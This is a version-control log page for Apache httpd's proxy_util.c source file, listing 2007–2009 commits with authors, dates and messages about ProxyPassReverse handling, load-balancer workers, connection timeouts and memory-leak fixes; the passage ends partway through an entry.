- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=893955)

Modified
*Sat Dec 26 10:30:52 2009 UTC*
(15 years, 1 month ago)
by *niq*

File length: 82341 byte(s)

Diff to [previous 893871](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=893871&r2=893955)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=893871&r2=893955&diff_format=h))
```
Fix [r893871](/viewvc?view=revision&revision=893871) as noted by rpluem, to remove risk of returning a
relative-ised URL, and fix erroneous CHANGES bug attribution.

```

---

Revision [**893871**](/viewvc?view=revision&revision=893871) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=893871&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=893871&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=893871))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=893871)

Modified
*Fri Dec 25 15:26:49 2009 UTC*
(15 years, 1 month ago)
by *niq*

File length: 82192 byte(s)

Diff to [previous 788718](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=788718&r2=893871)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=788718&r2=893871&diff_format=h))
```
Proxy: fix ProxyPassReverse with relative URL
PR 38864

```

---

Revision [**788718**](/viewvc?view=revision&revision=788718) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=788718&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=788718&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=788718))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=788718)

Modified
*Fri Jun 26 14:26:19 2009 UTC*
(15 years, 7 months ago)
by *jfclere*

File length: 81863 byte(s)

Diff to [previous 774423](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=774423&r2=788718)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=774423&r2=788718&diff_format=h))
```
Don't set worker->s if already set (for balancer using slotmem for examples).

```

---

Revision [**774423**](/viewvc?view=revision&revision=774423) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=774423&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=774423&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=774423))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=774423)

Modified
*Wed May 13 16:46:59 2009 UTC*
(15 years, 8 months ago)
by *jim*

File length: 81707 byte(s)

Diff to [previous 774400](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=774400&r2=774423)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=774400&r2=774423&diff_format=h))
```
Return APR_EGENERAL for the error

```

---

Revision [**774400**](/viewvc?view=revision&revision=774400) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=774400&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=774400&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=774400))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=774400)

Modified
*Wed May 13 15:27:05 2009 UTC*
(15 years, 8 months ago)
by *jfclere*

File length: 81695 byte(s)

Diff to [previous 772126](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=772126&r2=774400)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=772126&r2=774400&diff_format=h))
```
Allow the load balancing method to "create" workers.

```

---

Revision [**772126**](/viewvc?view=revision&revision=772126) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=772126&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=772126&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=772126))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=772126)

Modified
*Wed May 6 10:06:06 2009 UTC*
(15 years, 8 months ago)
by *rpluem*

File length: 81374 byte(s)

Diff to [previous 771976](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=771976&r2=772126)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=771976&r2=772126&diff_format=h))
```
* Fix syntax error

```

---

Revision [**771976**](/viewvc?view=revision&revision=771976) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=771976&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=771976&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=771976))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=771976)

Modified
*Tue May 5 19:29:04 2009 UTC*
(15 years, 8 months ago)
by *jim*

File length: 81373 byte(s)

Diff to [previous 771940](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=771940&r2=771976)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=771940&r2=771976&diff_format=h))
```
optimize.... rp! :)

```

---

Revision [**771940**](/viewvc?view=revision&revision=771940) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=771940&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=771940&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=771940))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=771940)

Modified
*Tue May 5 17:15:48 2009 UTC*
(15 years, 8 months ago)
by *jfclere*

File length: 81405 byte(s)

Diff to [previous 771925](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=771925&r2=771940)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=771925&r2=771940&diff_format=h))
```
Change the order of mod_proxy and mod_proxy_balancer child_init().
Change the balancer workers area to the address of workers instead copying the workers.
Arrange lbmethod accordingly.
Move the creation of conf->forward worker to mod_proxy child_init().

```

---

Revision [**771925**](/viewvc?view=revision&revision=771925) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=771925&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=771925&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=771925))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=771925)

Modified
*Tue May 5 16:55:56 2009 UTC*
(15 years, 8 months ago)
by *jim*

File length: 81382 byte(s)

Diff to [previous 771610](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=771610&r2=771925)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=771610&r2=771925&diff_format=h))
```
Explain empty code block (empty for now, that is) :)

```

---

Revision [**771610**](/viewvc?view=revision&revision=771610) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=771610&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=771610&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=771610))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=771610)

Modified
*Tue May 5 07:43:14 2009 UTC*
(15 years, 8 months ago)
by *rpluem*

File length: 81184 byte(s)

Diff to [previous 771587](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=771587&r2=771610)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=771587&r2=771610&diff_format=h))
```
* Silence compiler warning.

```

---

Revision [**771587**](/viewvc?view=revision&revision=771587) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=771587&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=771587&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=771587))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=771587)

Modified
*Tue May 5 06:44:02 2009 UTC*
(15 years, 8 months ago)
by *wrowe*

File length: 81180 byte(s)

Diff to [previous 771583](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=771583&r2=771587)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=771583&r2=771587&diff_format=h))
```
As mentioned inline in comments, correctly handle more sophisticated
transformations which currently fail for balancer://foo targets, but
work just fine with other ProxyReverse targets.

  The balancer comparison is a bit trickier.  Given the context

    BalancerMember balancer://alias <http://example.com/foo>
    ProxyPassReverse /bash balancer://alias/bar

  translate url <http://example.com/foo/bar/that> to /bash/that

E.g. there may be several different url-suffixes (1st order) of any
particular BalancerMember set e.g. /app1, /app1 and /appbeta while
there may be additional suffixes associated with the actual
ProxyPassReverse directive.  Neither were properly reversed, now
both should be properly handled.

One *critical* assumption;

    BalancerMember balancer://alias/foo <http://example.com/bar>

should be documented as a meaningless construct, since one cannot
have two members, balancer://alias/foo and balancer://alias/bar,
and the balancer member structures discard this path.

Note one more existing error case as an XXX comment due to invalid
uri comparisons.

```

---

Revision [**771583**](/viewvc?view=revision&revision=771583) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=771583&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=771583&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=771583))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=771583)

Modified
*Tue May 5 06:39:03 2009 UTC*
(15 years, 8 months ago)
by *wrowe*

File length: 80984 byte(s)

Diff to [previous 771581](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=771581&r2=771583)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=771581&r2=771583&diff_format=h))
```
REVERT 771581 modules/proxy/ changes (miscommitted)

```

---

Revision [**771581**](/viewvc?view=revision&revision=771581) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=771581&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=771581&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=771581))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=771581)

Modified
*Tue May 5 06:26:24 2009 UTC*
(15 years, 8 months ago)
by *wrowe*

File length: 81093 byte(s)

Diff to [previous 769020](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=769020&r2=771581)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=769020&r2=771581&diff_format=h))
```
complete [r771579](/viewvc?view=revision&revision=771579), refactoring mod_watchdog as loadable on win32

```

---

Revision [**769020**](/viewvc?view=revision&revision=769020) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=769020&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=769020&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=769020))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=769020)

Modified
*Mon Apr 27 15:02:40 2009 UTC*
(15 years, 9 months ago)
by *jim*

File length: 80984 byte(s)

Diff to [previous 758936](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=758936&r2=769020)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=758936&r2=769020&diff_format=h))
```
Fold in initial template for methods to be able to
reset (initialize) and "age" their data, useful when
adding new workers, or when workers come back into
the fold....

Logic and code to come in a bit :)

```

---

Revision [**758936**](/viewvc?view=revision&revision=758936) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=758936&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=758936&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=758936))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=758936)

Modified
*Fri Mar 27 00:05:18 2009 UTC*
(15 years, 10 months ago)
by *trawick*

File length: 80940 byte(s)

Diff to [previous 758891](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=758891&r2=758936)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=758891&r2=758936&diff_format=h))
```
remove TPF support

```

---

Revision [**758891**](/viewvc?view=revision&revision=758891) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=758891&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=758891&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=758891))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=758891)

Modified
*Thu Mar 26 22:23:44 2009 UTC*
(15 years, 10 months ago)
by *trawick*

File length: 80990 byte(s)

Diff to [previous 752140](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=752140&r2=758891)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=752140&r2=758891&diff_format=h))
```
remove BeOS OS support

```

---

Revision [**752140**](/viewvc?view=revision&revision=752140) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=752140&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=752140&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=752140))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=752140)

Modified
*Tue Mar 10 15:33:05 2009 UTC*
(15 years, 10 months ago)
by *jim*

File length: 81026 byte(s)

Diff to [previous 712375](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=712375&r2=752140)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=712375&r2=752140&diff_format=h))
```
Note for self: PPR drops the path info so we
don't really honor PPR /foo balancer://bar/jimbob
in a way that we would expect.

```

---

Revision [**712375**](/viewvc?view=revision&revision=712375) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=712375&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=712375&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=712375))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=712375)

Modified
*Sat Nov 8 11:09:38 2008 UTC*
(16 years, 2 months ago)
by *rpluem*

File length: 80917 byte(s)

Diff to [previous 706921](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=706921&r2=712375)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=706921&r2=712375&diff_format=h))
```
* Rip out the old flushing approach for solving lifetime issues between the
  backend connection bucket allocator and front end connection bucket allocator.
  Instead copy the buckets from the backend over to ones that have been created
  using the front end bucket allocator. For metabucket this is done by recreating
  them, for data buckets this is done by reading them and putting the read data
  in a transient bucket.

PR: 45792

```

---

Revision [**706921**](/viewvc?view=revision&revision=706921) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=706921&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=706921&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=706921))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=706921)

Modified
*Wed Oct 22 09:34:21 2008 UTC*
(16 years, 3 months ago)
by *rpluem*

File length: 84804 byte(s)

Diff to [previous 704753](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=704753&r2=706921)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=704753&r2=706921&diff_format=h))
```
* Improve the way to detect whether buckets in the filter chain need to be
  flushed by using the main requests bytes_count field instead of the
  subrequest field.

* Do not reset conn->need_flush. This prevents SegFaults from not flushing
  buckets in the filter chain.

PR: 45792

```

---

Revision [**704753**](/viewvc?view=revision&revision=704753) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=704753&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=704753&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=704753))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=704753)

Modified
*Wed Oct 15 00:53:39 2008 UTC*
(16 years, 3 months ago)
by *rpluem*

File length: 82004 byte(s)

Diff to [previous 703998](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=703998&r2=704753)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=703998&r2=704753&diff_format=h))
```
* Revert [r703998](/viewvc?view=revision&revision=703998).
  The call to apr_socket_timeout_set before apr_socket_connect already sets the
  socket to non-blocking mode because the timeout of the socket is -1 after creation. A further
  call to apr_socket_timeout_set (after the connect call does not do this, because the old
  and the new timeout are >=0). The further code expects the socket to be in non-blocking
  mode, otherwise we have regressions with ssl. This can be notified by running t/ssl/proxy
  on 2.2.x which runs much much slower with the patch applied. This does not happen
  on trunk because the socket is set back to non blocking by the core output filter
  (async write completion).

```

---

Revision [**703998**](/viewvc?view=revision&revision=703998) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=703998&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=703998&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=703998))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=703998)

Modified
*Mon Oct 13 10:06:28 2008 UTC*
(16 years, 3 months ago)
by *rpluem*

File length: 82748 byte(s)

Diff to [previous 697093](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=697093&r2=703998)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=697093&r2=703998&diff_format=h))
```
* Make the connection timeout to backends work by temporarily setting the
  socket to non blocking mode.

Submitted by: Matt Stevenson <mavricknzwork yahoo.com>
Reviewed by: rpluem

```

---

Revision [**697093**](/viewvc?view=revision&revision=697093) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=697093&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=697093&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=697093))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=697093)

Modified
*Fri Sep 19 13:43:48 2008 UTC*
(16 years, 4 months ago)
by *jim*

File length: 82004 byte(s)

Diff to [previous 684351](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=684351&r2=697093)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=684351&r2=697093&diff_format=h))
```
Allow for the smax param to be 0, so that all connections
are available to be dropped, should they be idle long
enough.
PR 43371

```

---

Revision [**684351**](/viewvc?view=revision&revision=684351) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=684351&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=684351&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=684351))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=684351)

Modified
*Sat Aug 9 21:33:09 2008 UTC*
(16 years, 5 months ago)
by *rpluem*

File length: 81954 byte(s)

Diff to [previous 684341](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=684341&r2=684351)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=684341&r2=684351&diff_format=h))
```
* Introduce environment variable proxy-initial-not-pooled to avoid reusing
  pooled connections if the client connection is an initial connection.
  This avoids the "proxy: error reading status line from remote server"
  error caused by the race condition that the backend server closed the
  connection after the connection check on our side and before our data
  reached the backend. Yes, this downgrades performance, especially with
  HTTP/1.0 clients. Hence it is configurable and off by default.

PR: 37770

```

---

Revision [**684341**](/viewvc?view=revision&revision=684341) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=684341&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=684341&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=684341))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=684341)

Modified
*Sat Aug 9 20:52:46 2008 UTC*
(16 years, 5 months ago)
by *rpluem*

File length: 81803 byte(s)

Diff to [previous 682369](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=682369&r2=684341)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=682369&r2=684341&diff_format=h))
```
* Add the possibility to set a separate connection timeout for backend
  workers.

PR: 45445
Submitted by: rahul <rahul sun.com>
Reviewed by: rpluem

```

---

Revision [**682369**](/viewvc?view=revision&revision=682369) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=682369&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=682369&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=682369))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=682369)

Modified
*Mon Aug 4 12:53:50 2008 UTC*
(16 years, 5 months ago)
by *rpluem*

File length: 81300 byte(s)

Diff to [previous 645807](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=645807&r2=682369)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=645807&r2=682369&diff_format=h))
```
* Remove call to apr_reslist_destroy. With the latest trunk version of
  apr-util this causes a lock during shutdown as at the point of time we would
  execute apr_reslist_destroy the reslist is already destroyed, because we are
  in a cleanup of the same pool where the reslist registered itself as
  precleanup.
  With apr-util 1.3.x calling apr_reslist_destroy is not really useful and
  needed in this case as we are in a cleanup that was registered against the
  same pool that is used by the reslist. As it was registered *after* the
  reslist was created it just runs *before* the reslist cleanup would run. This
  is somewhat pointless here and we could leave the job of destroying the
  reslist to the reslist cleanup.

```

---

Revision [**645807**](/viewvc?view=revision&revision=645807) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=645807&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=645807&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=645807))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=645807)

Modified
*Tue Apr 8 09:25:57 2008 UTC*
(16 years, 9 months ago)
by *jim*

File length: 81346 byte(s)

Diff to [previous 627740](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=627740&r2=645807)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=627740&r2=645807&diff_format=h))
```
Use what we have. This logic belongs here anyway...

```

---

Revision [**627740**](/viewvc?view=revision&revision=627740) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=627740&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=627740&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=627740))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=627740)

Modified
*Thu Feb 14 13:37:18 2008 UTC*
(16 years, 11 months ago)
by *jim*

File length: 81217 byte(s)

Diff to [previous 627728](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=627728&r2=627740)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=627728&r2=627740&diff_format=h))
```
Note why we aren't bothering to check that we have
a valid octet here.

```

---

Revision [**627728**](/viewvc?view=revision&revision=627728) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=627728&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=627728&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=627728))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=627728)

Modified
*Thu Feb 14 12:55:57 2008 UTC*
(16 years, 11 months ago)
by *jim*

File length: 81091 byte(s)

Diff to [previous 619125](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=619125&r2=627728)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=619125&r2=627728&diff_format=h))
```
Add in mod_jk's disablereuse analog for mod_proxy.

```

---

Revision [**619125**](/viewvc?view=revision&revision=619125) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=619125&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=619125&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=619125))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=619125)

Modified
*Wed Feb 6 19:52:04 2008 UTC*
(16 years, 11 months ago)
by *rpluem*

File length: 80906 byte(s)

Diff to [previous 616335](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=616335&r2=619125)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=616335&r2=619125&diff_format=h))
```
* Fix a typo (timout -> timeout)

PR: 44360
Submitted by: Rainer Jung <rainer.jung kippdata.de>
Reviewed by: rpluem

```

---

Revision [**616335**](/viewvc?view=revision&revision=616335) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=616335&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=616335&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=616335))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=616335)

Modified
*Tue Jan 29 14:26:20 2008 UTC*
(17 years ago)
by *jim*

File length: 80905 byte(s)

Diff to [previous 605838](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=605838&r2=616335)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=605838&r2=616335&diff_format=h))
```
Now let things like

   ProxyPassReverse /foo balancer://bar

work "as expected" :) :)

```

---

Revision [**605838**](/viewvc?view=revision&revision=605838) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=605838&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=605838&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=605838))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=605838)

Modified
*Thu Dec 20 08:57:23 2007 UTC*
(17 years, 1 month ago)
by *rpluem*

File length: 78823 byte(s)

Diff to [previous 605314](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=605314&r2=605838)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=605314&r2=605838&diff_format=h))
```
* Using the reslist pool for the proxy_conn_rec structure introduces a memory
  leak when connections get created and destroyed frequently by the reslist
  (e.g.  destroying idle elements of the reslist). So use the subpool
  dedicated for the proxy_conn_rec structure to allocate the memory for the
  structure itself.

```

---

Revision [**605314**](/viewvc?view=revision&revision=605314) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=605314&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=605314&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=605314))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=605314)

Modified
*Tue Dec 18 20:03:01 2007 UTC*
(17 years, 1 month ago)
by *rpluem*

File length: 78818 byte(s)

Diff to [previous 604449](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=604449&r2=605314)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=604449&r2=605314&diff_format=h))
```
* Only sent a flush bucket down the chain if buckets where sent down the chain
